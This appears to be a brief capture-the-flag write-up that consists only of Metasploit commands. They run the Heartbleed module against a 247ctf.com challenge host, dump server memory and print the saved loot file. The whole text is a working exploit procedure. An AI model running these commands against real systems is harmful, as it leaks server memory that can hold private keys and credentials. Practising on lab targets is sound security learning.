```bash
msfconsole
```

```bash
use auxiliary/scanner/ssl/openssl_heartbleed
show options
set rhost e8f03be12745e18.247ctf.com
set rport 50376
set action DUMP
exploit
cat ~/.msf4/loot/20250330053504_default_144.76.74.118_openssl.heartble_903152.bin
```
